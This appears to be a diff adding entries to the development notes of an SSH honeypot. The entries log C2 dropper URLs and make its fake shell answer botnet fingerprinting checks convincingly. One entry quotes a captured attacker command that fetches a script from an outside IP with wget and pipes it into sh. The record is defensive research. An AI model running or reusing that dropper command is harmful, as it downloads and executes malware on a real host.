@@ -668,3 +668,51 @@ Depends on how the attacker bot is implemented:
 The exec channel path (dropper_sim.go) is guaranteed to work -- the SCP client on the
 other end is explicitly in SCP mode. Interactive shell path depends on the attacker's
 implementation. Will know after next deploy when SCP dropper hits again.
+
+---
+
+### wget/curl URL logging (2026-05-30)
+
+**Experiment : capture C2 dropper URLs.**
+
+Added `log *slog.Logger` to Session struct. Set in Handle() after the sid is assigned
+so the URL log entries carry the same sid as the rest of the session.
+
+wget and curl now call sess.log.Info("wget fetch"/"curl fetch", "url", url) before
+returning the fake error. Guard: sess != nil && sess.log != nil so dispatch() calls
+from tests (no real session) don't panic.
+
+When the C2 dropper runs:
+  wget --no-check-certificate -qO- https://14.46.136.77/sh | sh -s ssh
+session.log will have: {"msg":"wget fetch","url":"https://14.46.136.77/sh","sid":"..."}
+
+The URL can then be looked up on Shodan/VirusTotal to identify the C2 infrastructure.
+
+---
+
+### bait for family 8 (SSHCHK) and family 9 (minimal scanner) (2026-05-30)
+
+**Family 9 -- uname -s -m:**
+Was returning "Linux\n". Added "-s-m" and "-sm" cases to unameCmd switch.
+Now returns "Linux x86_64\n" -- the minimal OS scanner gets the right answer.
+
+**Family 8 -- SSHCHK full command fix (4 issues):**
+
+1. uname -srm: added case, returns "Linux 6.8.0-49-generic x86_64\n" (kernel+release+machine).
+
+2. echo $((7*191+3)): implemented $((expr)) arithmetic expansion. Added evalArith()
+   recursive descent parser in commands.go (handles +, -, *, / with correct precedence).
+   expandVars now runs expandArith before os.Expand. $((7*191+3)) -> 1340.
+   The SSHCHK proof-of-work now returns the correct answer -- C2 thinks it has a real shell.
+
+3. awk 'NR==2{print $1}': awk was applying {print $1} to ALL lines. Added nrRe regex to
+   detect NR==N condition and skip all other lines. Now df -P / | awk 'NR==2{print $1}'
+   correctly returns "/dev/vda1".
+
+4. df -P /: added -P flag handling. Returns POSIX format (512-blocks header, one line for
+   root fs only). Required because awk NR==2 needs exactly 2 lines with the device on line 2.
+
+**Hidden bug found and fixed:**
+expandVars was calling os.Expand which mapped $1, $2 etc to "" (not in fakeEnv). This
+silently destroyed awk field references before the awk command ever saw them. Fixed by
+preserving $N where N is a digit -- return "$"+k instead of fakeEnv[k] for numeric keys.
